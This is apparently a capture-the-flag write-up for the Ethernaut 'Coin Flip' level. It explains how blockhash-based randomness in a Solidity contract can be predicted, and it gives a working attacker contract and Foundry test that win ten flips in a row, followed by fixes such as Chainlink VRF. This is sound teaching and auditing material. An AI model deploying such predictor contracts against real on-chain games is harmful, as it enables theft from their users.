# Level 3 - Coin Flip

## Objectives

- guess the correct outcome of the game 10 times in a row

## Contract Overview

The `CoinFlip` contract is a simple game where there's only one function `flip()` where user has to supply his guess, either `true` or `false`. If user's guessed bool matches the value of the side variable, then the `consecutiveWins` will be increased. `consecutiveWins` is initially set to 0 inside the constructor and it is again set to zero if user's guess is wrong. The goal of the game is to get the most consecutive wins.

In other words the contract is supposed to work as follows:

- Users can guess the number by calling `flip()` function and passing their
  guess as an argument to the `_guess` parameter
- If user's guessed bool matches the value of the side variable, then the `consecutiveWins` will be increased

```solidity
  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```

- `consecutiveWins` is initially set to 0 inside the constructor and it is again set to zero if user's guess is wrong

```solidity

  constructor() {
      consecutiveWins = 0;
  }
```

- The goal of the game is to get the most consecutive wins

## Static analysis (slither)

Here are the logs from the slither:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/CoinFlip_slither.png)

## Finding the weak spots

In this contract the weak spot is problem with randomness. Ethereum is a deterministic Turing machine, with no inherent randomness involved. To generate randomness in Ethereum developers often make use of data related to the blocks, i.e., block number, hash, etc. These variables may look random but are actually deterministic and can be exploited if the inputs are known. We have such problem in `CoinFlip` contract.

This weak spot can be abused by the attacker who have access to the source code of the smart contract and can reverse the game logic and calculate the winning condition in advance.

My goal is to get `consecutiveWins` up to 10. This variable is updated in `flip` function.

```solidity
    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
```

Let's look into how the `side` variable is getting its value. In the first line of the `flip` function, we can see the source of randomness named `blockValue`. This is then divided by the `FACTOR` which is also available to us and the result is stored int the variable `coinFlip`. If the value of coinFlip is 1, then the side will be set to true, otherwise, false.

```solidity
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  uint256 blockValue = uint256(blockhash(block.number - 1));

  uint256 coinFlip = blockValue / FACTOR;
```

We will be able to solve this challange if our `_guess` would be equal to computation variable `side` 10 times in a row. That's why we have to deploy a custom contract simulating the exact same coin flipping logic and calling the real challenge contract with this result.

## Potential attack scenario (hypothesis)

Attacker can create a malicious contract that will contain an attack function that calculates the outcome of the game in advance. He can call this function each block and score 10 consecutive wins easily.

## Plan of the attack

1. Attacker creates the malicious contract that will contain `flip` function that calculates the outcome of the game in advance.
2. Attacker calls the `flip` function from the malicious contract.
3. Attacker will repeat the attack in 10 consecutive blocks.

## Malicious contract (CoinFlipAttack.sol)

We will be able to solve this challange if our `_guess` would be equal to computation variable `side` 10 times in a row. That's why we have to deploy a custom malicious contract simulating the exact same coin flipping logic and calling the real challenge contract with this result.

Attacker should call the `flip` function from the malicious contract. The `flip` function calculates the outcome of the game -> boolean value
`side`. The `flip` function from the malicious contract calls the `flip()` function inside the `CoinFlip` contract. It passes the calculated `side` value as an argument to the `_guess` parameter of the `flip()` function.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip victimContract;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _victimContractAddress) public {
        victimContract = CoinFlip(_victimContractAddress);
    }

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        victimContract.flip(side);
    }
}
```

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/03-CoinFlip.t.sol))

```solidity
 // Malicious contract that contains `flip` function that calculates the outcome of the game in advance
        CoinFlipAttack coinFlipAttack = new CoinFlipAttack(levelAddress);

        emit log_named_uint(
            "Attacker's score before the attack: ",
            coinFlipContract.consecutiveWins()
        );
        emit log_string(
            "Attacker runs the exploit for 10 consecutive blocks..."
        );

        // Attack will be repeated in 10 consecutive blocks
        for (uint256 i = 1; i <= 10; i++) {
            vm.roll(i); // cheatcode to simulate running the attack on each subsequent block; we are using vm.roll() to create the next block
            // Calling the `flip` function from the malicious contract
            coinFlipAttack.flip();
            emit log_named_uint(
                "Consecutive wins: ",
                coinFlipContract.consecutiveWins()
            );
        }

        // Test assertion
        assertEq(coinFlipContract.consecutiveWins(), 10);
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/CoinFlip.png)

## Recommendations

- `CoinFlip` contract can be easily exploited by abusing the Weak PRNG. This can
  be used both by the miners and the potential malicious users.
  - The use of Chainlink VRF or RANDAO is recommended for generating randomness.
- The `flip()` function does not check if the caller is a contract. Such a check
  would prevent attacks like the one presented in the Proof of Concept. An
  example of such validation would be wrapping the logic of the `flip()`
  function in the `if / else` statement like the one shown below:

```solidity
function flip(bool _guess) public returns (bool) {
	if (msg.sender == tx.origin) {
		/*
		* LOGIC HERE
		*/
	}
	else {
		revert("Caller cannot be a contract!");
	}
}
```

- This however would not solve the problem completely. The attacker could still
  calculate the outcome of the game externally and call the `flip()` function
  manually or automate the whole process via a `bash` script.

## Additional information

You can also read my other solution (using Remix) on my blog: https://matrix-0wl.gitbook.io/ethernaut/3.-coin-flip-problem-of-randomness

## References

- [Blog Aditya Dixit](https://blog.dixitaditya.com/series/ethernaut)
- [D-Squared YT - Ethernaut CTF Series](https://www.youtube.com/watch?v=_ylKN2R_o-Y&list=PLiAoBT74VLnmRIPZGg4F36fH3BjQ5fLnz)
- [Mastering Ethereum book](https://github.com/ethereumbook/ethereumbook)

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)

The recommendations section is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
